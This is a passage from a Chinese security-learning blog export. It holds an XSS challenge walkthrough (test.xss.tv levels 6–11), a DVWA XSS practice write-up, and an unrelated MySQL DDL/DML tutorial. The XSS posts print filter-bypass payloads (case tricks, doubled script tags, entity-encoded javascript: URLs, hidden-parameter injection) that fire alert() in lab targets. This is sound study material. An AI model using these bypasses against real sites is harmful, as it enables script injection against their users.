value=\"&lt;scr_ipt&gt;alert(/hacker/)&lt;/script&gt;\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 12&lt;input name=keyword value=\"\"o_nclick=\"javascript:alert(/xss/)\"\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 12&lt;input name=keyword value=\"\"&gt;&lt;a hr_ef=\"javascript:alert(/xss/)\"&gt;点这里&lt;/a&gt;//\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 可以看到在这里，href和script、onclick事件都被过滤了。这里过滤的是onclick,改为大写试试。payload：1\"ONCLICK=\"javascript:alert(/hacker/)\" 在浏览博客的时候也看到一个大佬用的payload1\"&gt;&lt;svg x=\"\" Onclick=alert(1)&gt; 利用&lt;svg&gt;标签进行攻击。 第七关输入&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;查看页面源代码12&lt;input name=keyword value=\"\"&gt;&lt;a =\"java:alert(/xss/)\"&gt;点这里&lt;/a&gt;//\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 输入&quot;&gt;&lt;script&gt;alert(/hacker/)&lt;/script&gt;查看页面源代码12&lt;input name=keyword value=\"\"&gt;&lt;&gt;alert(/hacker/)&lt;/&gt;\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 这次更狠，直接把关键字给过滤没了用双写绕过payload：1\"&gt;&lt;sscriptcript&gt;alert(/hacker/)&lt;/sscriptcript&gt; 过滤掉中的script，但是一旦过滤掉，前后又可以重新拼接起来，形成一个完整的语句。 第八关输入&quot;onclick=&quot;javascript:alert(/hacker/)&quot;发现href,script被过滤，就试试onclick事件。页面源代码： 12&lt;input name=keyword value=\"&amp;quot;onclick=&amp;quot;javascript:alert(/hacker/)&amp;quot;\"&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt; 发现&quot;,&lt;,&gt;也被转义了。再次观察源代码，发现友情链接。。。真的是提示，这不就是&lt;a&gt;标签绕过吗?1234&lt;input name=keyword value=\"javascript:alert(1)\"&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=\"javascr_ipt:alert(1)\"&gt;友情链接&lt;/a&gt; 既然下面有&lt;a&gt;标签，那我们就直接输入这个语句1javascript:alert(/hacker/) 但是script会被过滤，换一种方式表达script采用HTML字符实体转换地址方法一：payload：1java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(/hacker/) 参考大佬的payload:方法二：用 html 的自解码机制就可以绕过1javasc&amp;#114;ipt:alert(0) 方法三：可以全转换为HTML实体1&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41; 第九关又是友情链接，把刚才的语句输入进去，查看页面源代码。 1234&lt;input name=keyword value=\"java&amp;amp;#x73;&amp;amp;#x63;&amp;amp;#x72;&amp;amp;#x69;&amp;amp;#x70;&amp;amp;#x74;:alert(/hacker/)\"&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=\"您的链接不合法？有没有！\"&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt; 我们输入的语句并没有进入到 &lt;a&gt;标签中，这里应该对格式有一定要求，查看大佬的博客后发现需要添加http://,否则不合法。payload：1java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(/hacker/)//http:// 第九关和第八关类似，区别就是第九关添加了url验证合法性。 第十关这次更狠，连个输入框都不给。那就先看一下页面源代码吧 12345&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"\" type=\"hidden\"&gt;&lt;/form&gt; 一脸懵，不知道该如何下手了,只能去查看大佬的wp了。先测试测试哪个可以注入查看页面源代码，发现123&lt;input name=\"t_link\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"\"text\"\" type=\"hidden\"&gt; 找到了，t_sort就是注入点，那就开始注入吧代码中有隐藏的参数设置,把hidden改为textpayload：1&amp;t_sort=\"onclick=\"alert(/hacker/)\"type=\"text\" 也可以1&amp;t_sort=\" type=\"text\" onclick=\"alert(/hacker/) 第十一关还没有输入框，那类型应该和第十关比较类似，先看页面源代码。 123456&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_ref\" value=\"http://test.xss.tv/level10.php?keyword=well%20done!&amp;t_sort=%22%20type=%22text%22%20onclick=%22alert(1)\" type=\"hidden\"&gt;&lt;/form&gt; 一样的方法，先测试一下看那个可以注入查看页面源代码123456&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"3\" type=\"hidden\"&gt;&lt;input name=\"t_ref\" value=\"\" type=\"hidden\"&gt;&lt;/form&gt; 发现了t_sort是可以注入的，把刚才的payload拿来试试1&lt;input name=\"t_sort\" value=\"&amp;quot;onclick=&amp;quot;alert(/hacker/)&amp;quot;type=&amp;quot;text&amp;quot;\" type=\"hidden\"&gt; 发现&quot;被转义了，把&quot;转化为HTML实体也不行。查大佬的wp吧发现做到这一关需要burpsuite抓包工具来帮忙,所以先做到这里,等到会用抓包工具了，再回过头来继续做。 未完待续————————","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"http://bealright.github.io/tags/XSS/"}]},{"title":"XSS理解+练习","slug":"web安全-XSS攻击（一)","date":"2019-04-23T23:22:21.000Z","updated":"2019-07-24T00:38:56.720Z","comments":true,"path":"2019/04/24/web安全-XSS攻击（一)/","link":"","permalink":"http://bealright.github.io/2019/04/24/web安全-XSS攻击（一)/","excerpt":"","text":"XSS攻击和SQL注入都是web安全中很常见的攻击方式，最近先学习XSS攻击，待到XSS学完后再去学习SQL注入，哇（感慨一番），这些知识真的太有趣了。 在开始之前，有必要了解一下概念 1、XSS跨站脚本攻击定义 跨站脚本攻击是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者访问者进行病毒侵害的一种攻击方式。为了与层叠样式表的缩写CSS区分开，跨站脚本攻击通常简写为XSS。 2、XSS类型1)反射型XSS 反射型XSS只是简单地将用户输入的数据直接或未经完善的安全过滤就在浏览器中进行输出，导致输出的数据中存在可被浏览器执行的代码数据。由于此种类型的跨站代码存在于URL中，所以黑客通常需要通过诱骗或加密变形等方式将存在恶意代码的链接发给用户，只有用户点击以后才能使得攻击成功实施。 2)存储型XSS 存储型XSS脚本攻击是指由于Web应用程序对用户输入数据的不严格，导致Web应用程序将黑客输入的恶意跨站攻击数据信息保存在服务端的数据库或其他文件形式中，当网页进行数据查询展示时，会从数据库中获取数据内容，并将数据内容在网页中进行输出展示，进而导致跨站脚本代码的执行。 3)DOM Based XSS 基于DOM的XSS跨站脚本攻击是通过修改页面。DOM节点数据信息而形成的XSS跨站脚本攻击。不同于反射型XSS和存储型XSS，基于DOM的XSS跨站脚本攻击往往需要针对具体的Javascript DOM代码进行分析，并根据实际情况进行XSS跨站脚本攻击的利用。 3、XSS攻击 1.XSS盗取用户信息 2.XSS盗取Cookie 3.XSS钓鱼攻击 4.XSS蠕虫攻击 了解完这些概念之后，就来实战。 一、在DVWA漏洞靶场练习 一、反射型XSS进行DVWA环境中，选择安全等级，这里就按照从低到高的顺序进行。选择XSS(Reflected),查看一下源代码。观察代码可以发现，这里没有任何过滤。那就输入最常用的语句 1&lt;script&gt;alert(/hacker/)&lt;/script&gt; 输入完之后便会出现这个弹窗了Medium接下来，切换到中级( Medium)如果还输入刚才我们输入的语句会出现什么结果，试试看。没有出现弹窗，看一下源代码。发现前面的&lt;script&gt;没有了，那就看看源代码中有什么过滤方式把&lt;script&gt;给过滤掉了查看源代码这里代码中用到了str_replace() 函数。str_replace() 函数的作用：替换字符串中的一些字符（区分大小写）。所以这里是把&lt;script&gt;给替换掉了，但是这个函数其实有个漏洞，区分大小写。。。那我输入这样的语句（大小写语句）1&lt;ScRipt&gt;alert(/hacker/)&lt;/script&gt; 这里代码只过滤了 &lt;script&gt;，那就换其他弹窗语句，也可以绕过。（body语句）1&lt;body onload=alert(/hacker/)&gt; 还可以采用双写绕过1&lt;sc&lt;script&gt;ript&gt;alert(/hacker/)&lt;/script&gt; 可以看到str_replace() 函数把包裹在外层的 &lt;script&gt;给过滤掉了，但是里面的并不会过滤掉，这样形成的还是一个完整的可执行的语句。 接下来，尝试高级的(high)拿&lt;script&gt;alert(/hacker/)&lt;/script&gt;这句来试试过滤完了，只剩下了一个&gt;那就看看源代码是如何过滤的preg_replace 函数执行一个正则表达式的搜索和替换。这里就了解一下正则表达式： 正则表达式(regularexpression)描述了一种字符串匹配的模式，可以用来检查一个串是否含有某种子串、将匹配的子串做替换或者从某个串中取出符合某个条件的子串等。 那这里就可以理解为代码将&lt;script全给替换了，那如何绕过。。。那我换一个语句弹窗不就行了。。。这里可以用body标签来弹框。1&lt;body onload=alert(/hacker/)&gt; 这就出现弹窗了。 二、储存型XSS 储存型和反射型最大的区别便是持久型，下面就从low到high练习，就可以清除的明白这两种类型的区别了。 low先看源代码代码很长，但我们只看最后输入结果那部分代码，发现stripslashes() 函数，查一下，发现这个函数的用法：删除由 addslashes() 函数添加的反斜杠。所以没有如何过滤，直接最常用的语句就可以了 1&lt;script&gt;alert(/hacker/)&lt;/script&gt; 但是这里有字数限制，没有办法输入了那就打开F12改一下改为之后输入成功，下面看看有啥区别，先跳转到其他页面去，再打开这个页面，会发现。。。又给我们弹出了这个页面，这就是储存型XSS。每当你登陆这个界面，就会弹出这个弹框。 Medium接下来，看一下中级的。还是先输入一下常见的语句可以看到&lt;script&gt;被过滤掉了。看一下源代码和反射型XSS的Medium一样，所以可以用这两个语句绕过123&lt;body onload=alert(/hacker/)&gt;&lt;sc&lt;script&gt;ript&gt;alert(/hacker/)&lt;/script&gt;&lt;ScRipt&gt;alert(/hacker/)&lt;/script&gt; 这里我们把三种语句都注入，再次点击这个页面会出现三次弹窗 high正则表达式，用之前的语句就可以直接绕过。 通过这些练习，可以了解就反射型的XSS攻击时间短，例如弹窗只弹出一次，而存储型的XSS攻击则直接储存在数据库中，只要用户访问就可以弹出。 将安全等级调至impossible安全等级调至到impossible，即不可绕过。就以反射型的XSS来说吧先以最常用的语句来攻击结果：发现&lt;和&gt;都被转换了，我们就去看一下源代码发现了这样的一个函数PHP htmlspecialchars() 函数，htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。预定义的字符是： &amp; （和号）成为 &amp;amp; &quot; （双引号）成为 &amp;quot; &apos; （单引号）成为 &apos; &lt; （小于）成为 &amp;lt; &gt; （大于）成为 &amp;gt; 所以这个函数就把我们输入的&lt;和&gt;给过滤掉了，所以这是一种防护手段，防止恶意的XSS攻击。 下面看一下存储型XSS的impossible还是先用常用的攻击一下显示结果：这就不需要再看后台源码了，这直接就显示&lt;和&gt;已经被过滤了.我们就看一下源代码发现在输出那有一个htmlspecialchars() 函数，所以这个原理就和反射型XSS攻击一样。这样DVWA练习就结束了。 感悟：果然只有动手去操作了，才会了解一些概念和一些攻击方式，有很多很好的平台供自己去学习，合天、安全龙、漏洞银行等等，只要自己想要去学，这些东西都可以学到，接下来就去XSS通关平台和谨灵实验室继续练习。 努力吧，少年！！！","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"http://bealright.github.io/tags/XSS/"}]},{"title":"PHP数据库概念、DDL语句、DML语句","slug":"PHP学习总结（数据库概念、DDL语句、DML语句）","date":"2019-04-22T01:38:24.000Z","updated":"2019-06-09T12:00:12.387Z","comments":true,"path":"2019/04/22/PHP学习总结（数据库概念、DDL语句、DML语句）/","link":"","permalink":"http://bealright.github.io/2019/04/22/PHP学习总结（数据库概念、DDL语句、DML语句）/","excerpt":"","text":"自从做完一个简单的登陆注册页面，发现数据库知识真的很重要，所以要详细的学习一下数据库的知识。 一、数据库基本概念数据库可以理解为用来存储信息的仓库 表:表是数据的矩阵，在一个数据库中的表看起来像一个简单的电子表格。列: 一列(数据元素) 包含了相同的数据, 例如邮政编码的数据。行：一行（=元组，或记录）是一组相关的数据，例如一条用户订阅的数据。冗余：存储两倍数据，冗余降低了性能，但提高了数据的安全性。主键：主键是唯一的。一个数据表中只能包含一个主键,可以使用主键来查询据。表头(header): 每一列的名称;基本概念可以在菜鸟教程中学习菜鸟教程 二、DDL语句对数据库的操作 1).创建数据库1create database 数据库名; 例如:12mysql&gt; use bss;/使用这个名为bss的数据库Database changed 2)选择要操作的数据库1use 数据库名; 3)查看数据库中所有的数据表1show tables; 4)删除数据库1drop database 数据库名称; 例如：12345678910111213141516171819mysql&gt; create database xiao;Query OK, 1 row affected (0.00 sec)/这样就新建一个数据库，我们也可以在查看一下。mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || bss || myhtml || mysql || performance_schema || score || test || xiao |+--------------------+8 rows in set (0.00 sec)/这样数据库中便有了这个xiao数据库，接下来再删除它。mysql&gt; drop database xiao;Query OK, 0 rows affected (1.85 sec)/这样xiao数据库就被删除了。 对表的操作 1）创建表1234create table 表名( 字段1名 字段1类型 列的约束条件(可加可不加), 字段2名 字段2类型 列的约束条件, ); 例如：12create table Q(id1 int,id2 int);/这样就创建好一个名为Q的表 2）查看表1234show tables;//查看表数据desc 表名;//查看表结构 例如：12345678910111213141516171819mysql&gt; desc user;/查看表结构+-------+-------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || pass | varchar(30) | YES | | NULL | || name | varchar(30) | YES | | NULL | || ttt | varchar(40) | YES | | NULL | || sss | varchar(20) | YES | | NULL | |+-------+-------------+------+-----+---------+-------+5 rows in set (0.01 sec)mysql&gt; show tables;/查看表数据+---------------+| Tables_in_bss |+---------------+| user || zzh |+---------------+2 rows in set (0.00 sec) 3）查看创建表的SQL语句123show create table 表名 \\Gshow create table 表名；//第一种相较于第二种更直观一些 例如：12345678910111213mysql&gt; show create table user;//查看建表命令+-------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Table | Create Table |+-------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| user | CREATE TABLE `user` ( `id` int(11) DEFAULT NULL, `pass` varchar(30) DEFAULT NULL, `name` varchar(30) DEFAULT NULL, `ttt` varchar(40) DEFAULT NULL, `sss` varchar(20) DEFAULT NULL) ENGINE=MyISAM DEFAULT CHARSET=utf8 |+-------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) 4)删除表1drop table 表名; 例如：12345678910111213141516171819202122mysql&gt; create table hello(id int,you varchar(30),me varchar(30));Query OK, 0 rows affected (1.78 sec)/接下来我们查看一下mysql&gt; show tables;+---------------+| Tables_in_bss |+---------------+| hello || user || zzh |+---------------+3 rows in set (0.00 sec)/这样bbs数据库中便有这个hello的数据表了mysql&gt; drop table hello;Query OK, 0 rows affected (0.00 sec)mysql&gt; show tables;+---------------+| Tables_in_bss |+---------------+| user || zzh |+---------------+2 rows in set (0.00 sec)/这样就删除了刚才所创建的数据表 5)修改表的字段类型1alter table 表名 modify 字段名 字段类型; 例如：1alter table Q modify id1 varchar; 6)增加表字段1alter table 表名 add 字段名 字段类型; 例如：1alter table Q add id3 int; 7)删除表字段1alter table 表名 drop 字段名; 例如：1234567891011121314mysql&gt; alter table user drop pass;Query OK, 3 rows affected (1.81 sec)Records: 3 Duplicates: 0 Warnings: 0mysql&gt; desc user;/再次查询+----------+--------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+--------------+------+-----+---------+----------------+| Id | int(11) | NO | PRI | NULL | auto_increment || username | varchar(255) | YES | | NULL | || password | varchar(255) | YES | | NULL | |+----------+--------------+------+-----+---------+----------------+3 rows in set (0.01 sec)/这样的话就将新建的pass字段给删除了 8)字段改名1alter table 表名 change 旧字段名 新字段名 字段类型; 例如：123456789101112131415161718192021222324mysql&gt; desc zzh;+-------+-------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || he | varchar(20) | YES | | NULL | || me | varchar(40) | YES | | NULL | |+-------+-------------+------+-----+---------+-------+3 rows in set (0.01 sec)/这里我们想把字段he改为youmysql&gt; alter table zzh change he you varchar(20);Query OK, 0 rows affected (0.37 sec)Records: 0 Duplicates: 0 Warnings: 0/再次进行查询mysql&gt; desc zzh;+-------+-------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || you | varchar(20) | YES | | NULL | || me | varchar(40) | YES | | NULL | |+-------+-------------+------+-----+---------+-------+3 rows in set (0.01 sec)/可以看到he已经改为了you 9)修改字段排列排序例如： 12alter table Q modify id2 tinyint first;alter table Q modify id2 tinyint after id1; 10)更改表名1alter table 表名 rename 新的表名; 例如：12345678910111213141516171819202122mysql&gt; use bss;Database changedmysql&gt; show tables;+---------------+| Tables_in_bss |+---------------+| user || zzh |+---------------+2 rows in set (0.00 sec)/接下来我们把数据表user的名字改为usernamemysql&gt; alter table user rename username;Query OK, 0 rows affected (1.75 sec)/这些便实现了改表名称mysql&gt; show tables;+---------------+| Tables_in_bss |+---------------+| username || zzh |+---------------+2 rows in set (0.00 sec) DML语句这里我使用test数据库中的welcome表来进行练习 1)查询语句1select * from 表名; 2)插入记录1insert into 表名(字段1,字段2,字段3,...,字段n) values(值1,值2,值3,...,值n); 注意：values后面的顺序应该和字段的排序一致例如：123456789101112131415mysql&gt; insert into welcome(username,password) values('WMM',123); Query OK, 1 row affected (0.00 sec)/注意values中有字符的话，用单引号括起来。mysql&gt; insert into welcome(username,password) values(2,123); Query OK, 1 row affected (0.31 sec)/这里插入两条数据mysql&gt; select * from welcome;/查询语句 +----------+----------+ | username | password | +----------+----------+ | QTFY | 123 | | 2 | 123 | | WMM | 123 | +----------+----------+ 3 rows in set (0.00 sec) 3)一次插入多条记录12345insert into 表名(字段1,字段2,字段3,...,字段n) values (值1,值2,值3,...,值n), (值1,值2,值3,...,值n), (值1,值2,值3,...,值n); 例如：1234567891011121314151617181920mysql&gt; insert into welcome(username,password) values -&gt; (1,123), -&gt; (2,123), -&gt; (3,123), -&gt; (4,123); Query OK, 4 rows affected (0.00 sec) Records: 4 Duplicates: 0 Warnings: 0 mysql&gt; select * from welcome; +----------+----------+ | username | password | +----------+----------+ | QTFY | 123 | | 2 | 123 | | WMM | 123 | | 1 | 123 | | 2 | 123 | | 3 | 123 | | 4 | 123 | +----------+----------+ 7 rows in set (0.00 sec) 4)更新记录1.更新一个表 1update 表名 set 字段1=值1,字段2=值2,...字段n=值n [where 条件]; 例如：1234567891011121314151617mysql&gt; update welcome set password=1234 where username='QTFY'; Query OK, 1 row affected (0.00 sec) Rows matched: 1 Changed: 1 Warnings: 0 mysql&gt; select * from welcome; +----------+----------+ | username | password | +----------+----------+ | QTFY | 1234 | | 2 | 123 | | WMM | 123 | | 1 | 123 | | 2 | 123 | | 3 | 123 | | 4 | 123 | +----------+----------+ 7 rows in set (0.00 sec) /可以看到QTFY的密码已经从123改为1234 2.更新多个表中数据1update 表1,表2,...表n set 表1.字段1=表达式1,表n.字段n=表达式n [where 条件]; 例如：123456789101112131415161718192021222324252627282930/首先再创建一个表Qmysql&gt; create table Q(id int,age int);Query OK, 0 rows affected (0.08 sec)mysql&gt; desc Q;+-------+---------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+---------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || age | int(11) | YES | | NULL | |+-------+---------+------+-----+---------+-------+2 rows in set (0.02 sec)mysql&gt; insert into Q(id,age) values(1,20);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from Q;+------+------+| id | age |+------+------+| 1 | 20 |+------+------+1 row in set (0.00 sec)/更新语句mysql&gt; update welcome,Q set welcome.password=2000,Q.age=2000 where welcome.username='QTFY' and Q.age=20;Query OK, 2 rows affected (0.00 sec)Rows matched: 2 Changed: 2 Warnings: 0/更新结果：| QTFY | 20001 | 2000 | 5)删除记录1.删除单表中的数据 1delete from 表名 [where 条件]; 例如：1234567891011121314151617181920212223242526272829mysql&gt; select * from welcome; +----------+----------+ | username | password | +----------+----------+ | QTFY | 2000 | | 2 | 123 | | WMM | 123 | | 1 | 123 | | 2 | 123 | | 3 | 123 | | 4 | 123 | +----------+----------+ 7 rows in set (0.00 sec) /这里删除WMM记录 mysql&gt; delete from welcome where username='WMM'; Query OK, 1 row affected (0.00 sec) /删除成功了 mysql&gt; select * from welcome; +----------+----------+ | username | password | +----------+----------+ | QTFY | 2000 | | 2 | 123 | | 1 | 123 | | 2 | 123 | | 3 | 123 | | 4 | 123 | +----------+----------+ 6 rows in set (0.00 sec) 2.删除多个表中的数据、delete 表1,表2,…表n from 表1,表2,…表n [where 条件];不管是单表还是多表，不加where条件将会把表中的所有记录删除，所以操作时一定要小心。这里的操作和更新多表大致一样。 6)查询记录12select * from 表名;// 查询所有纪录 12select 字段名 from 表名； //查询某个字段的记录 例如：123456789101112131415161718192021mysql&gt; desc welcome; +----------+--------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +----------+--------------+------+-----+---------+-------+ | username | varchar(255) | YES | | NULL | | | password | varchar(255) | YES | | NULL | | +----------+--------------+------+-----+---------+-------+ 2 rows in set (1.75 sec) /这里查username字段的记录 mysql&gt; select username from welcome; +----------+ | username | +----------+ | QTFY | | 2 | | 1 | | 2 | | 3 | | 4 | +----------+ 6 rows in set (0.00 sec) 7)查询不重复的记录123 select distinct field1,field2 from 表名;//只要field1,field2任何一个字段有不同就会被选择！//一般使用distinct,只筛选一个字段! 例如：123456789101112131415161718192021222324mysql&gt; select username from welcome; +----------+ | username | +----------+ | QTFY | | 2 | | 1 | | 2 | | 3 | | 4 | +----------+ 6 rows in set (0.00 sec) /采用查询不重复记录语句 mysql&gt; select distinct username from welcome; +----------+ | username | +----------+ | QTFY | | 2 | | 1 | | 3 | | 4 | +----------+ 5 rows in set (1.63 sec) 8)条件查询123= &lt; &gt; &gt;= &lt;= != 比较运算符//多个条件之间可以使用or and等//select * from 表名 where 条件 例如：12345678910111213141516171819202122232425262728293031323334353637mysql&gt; select * from welcome where username=4; +----------+----------+ | username | password | +----------+----------+ | 4 | 123 | +----------+----------+ 1 row in set, 1 warning (0.00 sec) / or的用法 mysql&gt; select * from welcome where username=4 or username=3; +----------+----------+ | username | password | +----------+----------+ | 3 | 123 | | 4 | 123 | +----------+----------+ 2 rows in set, 2 warnings (0.00 sec) /and的用法 mysql&gt; select * from welcome where username&gt;1 and username&lt;4 ; +----------+----------+ | username | password | +----------+----------+ | 2 | 123 | | 2 | 123 | | 3 | 123 | +----------+----------+ 3 rows in set, 1 warning (0.00 sec) mysql&gt; select * from welcome where username&gt;=1 and username&lt;=4 ; +----------+----------+ | username | password | +----------+----------+ | 2 | 123 | | 1 | 123 | | 2 | 123 | | 3 | 123 | | 4 | 123 | +----------+----------+ 5 rows in set, 1 warning (0.00 sec) 9)排序和限制1234567排序: asc:由低到高 select * from 表名 order by 字段名 asc; desc:由高到底 select * from 表名 order by 字段名 desc; 多个字段排序 select * from 表名 order by 字段名 desc,字段名 desc; 例如：123456789101112131415161718192021222324252627282930313233343536373839/asc:由低到高mysql&gt; select * from welcome order by username asc;+----------+----------+| username | password |+----------+----------+| 1 | 123 || 2 | 123 || 2 | 123 || 3 | 123 || 4 | 123 || QTFY | 2000 |+----------+----------+6 rows in set (1.69 sec)/desc:由高到底mysql&gt; select * from welcome order by username desc;+----------+----------+| username | password |+----------+----------+| QTFY | 2000 || 4 | 123 || 3 | 123 || 2 | 123 || 2 | 123 || 1 | 123 |+----------+----------+6 rows in set (0.00 sec)/多个字段排序mysql&gt; select * from welcome order by username desc,password desc;+----------+----------+| username | password |+----------+----------+| QTFY | 2000 || 4 | 123 || 3 | 123 || 2 | 123 || 2 | 123 || 1 | 123 |+----------+----------+6 rows in set (0.00 sec) 限制:12在语句的最后面 加上limit 数字1,数字2 来进行查询数量的限制。limit 数字1,数字2 数字1代表从第几条记录开启取(是从0开始的)，数字2代表取几条！ 例如：123456789/从0条开始取一条mysql&gt; select * from welcome order by username desc limit 0,1 -&gt; ;+----------+----------+| username | password |+----------+----------+| QTFY | 2000 |+----------+----------+1 row in set (0.00 sec) 10)聚合sum求和 1select sum(字段名) from 表名; 例如;1234567mysql&gt; select sum(password) from welcome; +---------------+ | sum(password) | +---------------+ | 2615 | +---------------+ 1 row in set (1.66 sec) count记录总数1select count(*|字段名) from 表名; 例如：1234567mysql&gt; select count(*) from welcome; +----------+ | count(*) | +----------+ | 6 | +----------+ 1 row in set (1.56 sec) max最大值1select max(字段名) from 表名; 例如：1234567mysql&gt; select max(password) from welcome; +---------------+ | max(password) | +---------------+ | 2000 | +---------------+ 1 row in set (0.00 sec) min最小值1select min(字段名) from 表名; GROUP BY分类聚合1select department,sum(字段名) from 表名 group by 字段名; WITH ROLLUP分类聚合后的结果进行再汇总1select sum(字段名) from 表名 group by 字段名 with rollup; HAVING 12注意：having和where的区别在于，having是对聚合后的结果进行条件过滤，而where是在聚合前就对记录进行过滤 ，应该尽可能的对记录进行先过滤！select sum(字段名) from 表名 group by 字段名 having sum(字段名)&gt;1000; 11)表连接显示多个表中的字段的时候即可使用表连接内连接：选取两张表中相互匹配的记录例如： 12345678910111213141516171819202122232425//这样的语句可以把两张表中互相匹配的记录放在一起 mysql&gt; select * from welcome,Q where welcome.username=Q.id; +----------+----------+------+------+ | username | password | id | age | +----------+----------+------+------+ | 1 | 6 | 1 | 6 | | 2 | 5 | 2 | 5 | | 3 | 4 | 3 | 4 | | 4 | 3 | 4 | 3 | | 5 | 2 | 5 | 2 | | 6 | 1 | 6 | 1 | +----------+----------+------+------+ 6 rows in set (1.65 sec) mysql&gt; select welcome.username,Q.id from welcome,Q where welcome.username=Q.id; +----------+------+ | username | id | +----------+------+ | 1 | 1 | | 2 | 2 | | 3 | 3 | | 4 | 4 | | 5 | 5 | | 6 | 6 | +----------+------+ 6 rows in set (0.00 sec) 1内连接：select 表.字段名,.... from 表1名,表2名,... where 表1.字段=表2.字段; 外连接： 仅仅选取两张相互匹配的记录，并且会选出其他不匹配的记录左连接 概念：包含左边表中的所有记录(包括右表中没有和它匹配的记录)例如：12345678910111213mysql&gt; select * from welcome left join Q on welcome.username=Q.id; +----------+----------+------+------+ | username | password | id | age | +----------+----------+------+------+ | 1 | 6 | 1 | 6 | | 6 | 1 | 6 | 1 | | 5 | 2 | 5 | 2 | | 2 | 5 | 2 | 5 | | 3 | 4 | 3 | 4 | | 4 | 3 | 4 | 3 | +----------+----------+------+------+ 6 rows in set (0.00 sec) /查出左边表的所有记录，不管右边有没有相匹配的 右连接 概念：包含右边表中的所有记录(包括左表中没有和它匹配的记录) 左连接和右连接是可以相互转换的！例如：123456789101112mysql&gt; select * from Q right join welcome on welcome.username=Q.id; +------+------+----------+----------+ | id | age | username | password | +------+------+----------+----------+ | 1 | 6 | 1 | 6 | | 6 | 1 | 6 | 1 | | 5 | 2 | 5 | 2 | | 2 | 5 | 2 | 5 | | 3 | 4 | 3 | 4 | | 4 | 3 | 4 | 3 | +------+------+----------+----------+ 6 rows in set (0.00 sec) 12)子查询一个查询需要另外一个查询的结果参与的时候 用于子查询的关键字: in 语法：select from 表名 where id in(select 字段名 from 表名); in 在..里面 注意点 in后面的子语句必须只返回一个字段 若查询结果唯一(只有一条)可以使用=代替in not in 与in相反 exists 语法：select语句 where exists(select 语句); exists：后面那个子语句有没有查询出记录来，如果查询出记录来返回true,否则就是false 并且查询出来的记录的具体的值是NULL也是没有关系,也是返回true. not exits 与exists相反 1)select from 表名 where deptno in(select deptno from 表名); 2)若查询结果唯一可以使用=代替in select * from 表名 where deptno=(select deptno from 表名 limit 限制条件); 13)记录联合​ 需要将两个表或者多个表的数据按照一定的查询条件查询出来后，将结果合并到一起显示这是就需要用到记录联合 多个select 语句用 UNION或者UNION ALL隔开即可实现 区别： 前者 会将多个查询结果合并后并且进行去除重复后返回 后者 则直接合并并不去除重复 联合的条件：查询的列个数要相等例如： 1234567891011121314151617181920212223242526272829303132//第一种去除了重复的 mysql&gt; select * from welcome union select * from Q; +----------+----------+ | username | password | +----------+----------+ | 1 | 6 | | 6 | 1 | | 5 | 2 | | 2 | 5 | | 3 | 4 | | 4 | 3 | +----------+----------+ 6 rows in set (0.00 sec) //第二种没有去掉重复的 mysql&gt; select * from welcome union all select * from Q; +----------+----------+ | username | password | +----------+----------+ | 1 | 6 | | 6 | 1 | | 5 | 2 | | 2 | 5 | | 3 | 4 | | 4 | 3 | | 1 | 6 | | 2 | 5 | | 3 | 4 | | 4 | 3 | | 5 | 2 | | 6 | 1 | +----------+----------+ 12 rows in set (0.00 sec) 